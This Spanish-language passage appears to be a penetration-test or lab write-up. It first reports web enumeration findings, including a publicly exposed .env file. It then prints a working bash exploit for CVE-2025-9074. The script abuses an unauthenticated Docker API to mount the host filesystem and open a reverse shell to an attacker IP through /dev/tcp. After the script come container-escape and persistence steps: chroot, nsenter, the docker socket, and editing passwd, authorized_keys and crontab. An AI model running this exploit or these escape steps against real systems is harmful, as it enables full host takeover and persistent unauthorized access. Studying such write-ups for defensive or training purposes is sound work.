Durante el escaneo se permitió la recursión y se aceptaron todos los códigos de estado HTTP, lo que facilitó la detección de recursos tanto públicos como potencialmente sensibles.

Resultados relevantes

El fuzzing reveló múltiples recursos accesibles, principalmente archivos estáticos y rutas funcionales de la aplicación:

Rutas funcionales destacadas

  • /login – Página de autenticación.
  • /forgot-password – Funcionalidad de recuperación de contraseña.
  • /contact – Página de contacto.
  • /user – Ruta potencialmente asociada a perfiles de usuario.

Archivos y recursos sensibles

  • /.env – Archivo de variables de entorno accesible públicamente, lo cual representa un riesgo crítico, ya que puede contener credenciales, claves API u otra información sensible.

Estructura estática

Se identificó una estructura extensa de archivos estáticos bajo el directorio /static/, incluyendo:

  • Recursos CSS y JavaScript.
  • Imágenes.
  • Un panel administrativo ubicado en /static/admin/, lo que sugiere la posible existencia de una interfaz administrativa o backend asociado.

Conclusión inicial

La enumeración web permitió identificar rutas clave de la aplicación, así como la exposición directa del archivo .env, lo que indica una mala configuración del servidor. Este hallazgo abre la puerta a una posible comprometida inicial mediante la obtención de credenciales o secretos de la aplicación, por lo que será analizado en profundidad en las siguientes fases del ataque.

#### CVE-2025-9074 (Docker API Escape)

#!/bin/bash

DOCKER_HOST="http://192.168.65.7:2375"
LHOST="10.10.17.173"
LPORT="4445"

echo "Enumerando imagenes..."
curl -s "$DOCKER_HOST/images/json" | grep -o '"RepoTags":\["[^"]*"\]'

echo "Creando contenedor malicioso..."
JSON_PAYLOAD=$(cat <<EOF
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}
EOF
)

echo "$JSON_PAYLOAD" > /tmp/create_container.json
curl -H 'Content-Type: application/json' -d @/tmp/create_container.json "$DOCKER_HOST/containers/create" -o /tmp/response.json

CID=$(grep -o '"Id":"[^"]*"' /tmp/response.json | cut -d'"' -f4)
echo "Container ID: $CID"

echo "Iniciando contenedor..."
curl -X POST "$DOCKER_HOST/containers/$CID/start"

echo "Listo. Escucha en $LHOST:$LPORT"

1. Docker API sin autenticación (:2375)

  • Puerto 2375 es el Docker daemon API sin TLS
  • No requiere autenticación → acceso total al Docker Engine
  • Error de configuración típico en entornos comprometidos

2. Bind Mount con acceso completo al host:

json

"Binds": ["/mnt/host/c:/host_root"]

  • Monta la raíz del sistema host (C:\ en Windows via WSL2) dentro del contenedor
  • En Linux sería /:/host_root normalmente
  • Te da acceso de lectura/escritura al filesystem completo del host

3. Comando con reverse shell como root:

bash

"Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"]

  • El contenedor se ejecuta con UID 0 (root) por defecto

  • Desde dentro del contenedor puedes:

    • Modificar archivos del host via /host_root

    • Escalar a root del host mediante:

      bash

      Desde la reverse shell en el contenedor

      chroot /host_root /bin/bash

      O:

      bash

      nsenter --mount=/proc/1/ns/mnt /bin/bash

4. WSL2 Path /mnt/host/c específico:

  • En WSL2, /mnt/host/c es el acceso directo al filesystem de Windows

  • Con este montaje obtienes acceso administrativo al sistema Windows

Escalada completa:

  1. Shell dentro del contenedor como root (contenedor)

  2. Acceso al filesystem del host via bind mount

  3. Modificar archivos críticos del host:

    • /host_root/etc/passwd (añadir usuario root)

    • /host_root/root/.ssh/authorized_keys (SSH como root)

    • /host_root/etc/crontab (ejecutar comandos como root)

  4. Escape completo usando técnicas como:

    bash

    Método 1: via chroot

    chroot /host_root /bin/bash

    Método 2: via nsenter

    nsenter --mount=/proc/1/ns/mnt /bin/bash

    Método 3: via docker.sock

    docker -H unix:///host_root/var/run/docker.sock run -v /:/host2 -it ubuntu bash

Impacto final: Control total del host Windows/Linux como administrador/root.
